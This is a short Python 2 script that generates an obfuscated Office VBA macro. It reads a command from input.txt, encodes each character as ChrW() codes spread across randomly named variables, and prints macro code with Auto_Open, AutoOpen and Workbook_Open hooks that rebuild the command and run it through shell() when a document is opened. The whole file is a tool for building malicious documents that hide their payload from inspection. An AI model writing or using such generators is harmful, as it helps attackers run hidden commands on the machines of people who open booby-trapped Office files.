#!/usr/bin/python2.7


import string
import random


def generateRando():
    length = random.randint(4,8)
    i=0
    obfuscvar = ""
    while i < length:
        rando = random.choice(string.ascii_letters.lower())
        obfuscvar = obfuscvar + rando
        i+=1

    return obfuscvar

print generateRando()

with open('input.txt', 'r') as handle:
    first_line = handle.readline()
numvar=len(first_line)/10 + 9
i = 0
s = []

while i < len(first_line):
    s.append(first_line[i])
    i += 1
j=0
n = []
while j < numvar:
    n.append(generateRando())
    j +=1

# print n
# print s


print "Sub Auto_Open()"
print "\tDim newb As String"
for x in n:
    print "\tDim " + x + " As String"

v=[]
for x in s:
   v.append('ChrW(' + str(ord(x)) + ')')


#for x in n:
#    print "\t" + x + " = "

te = 0
ve = 0
tr = 0
while ve < len(v):
        try:
            print "\t" + n[tr] + ' = ' + v[ve] + ' & '  + v[ve + 1] + ' & '  + v[ve + 2] + ' & '  + v[ve + 3] + ' & '  + v[ve + 4] + ' & '  + v[ve + 5] + ' & '  + v[ve + 6] + ' & ' + v[ve + 7] + ' & ' + v[ve + 8] + ' & ' + v[ve + 9]
            tr += 1
            ve += 10
        except:
            print "\t" + n[tr] + ' = ' + v[ve]
            ve += 1
            tr += 1


print "\tnewb = " + (' + '.join(n))
print "\tshell(newb)"
print "End Sub"
print "Sub AutoOpen()"
print "\tAuto_Open"
print "End Sub"
print "Sub Workbook_Open()"
print "\tAuto_Open"
print "End Sub"

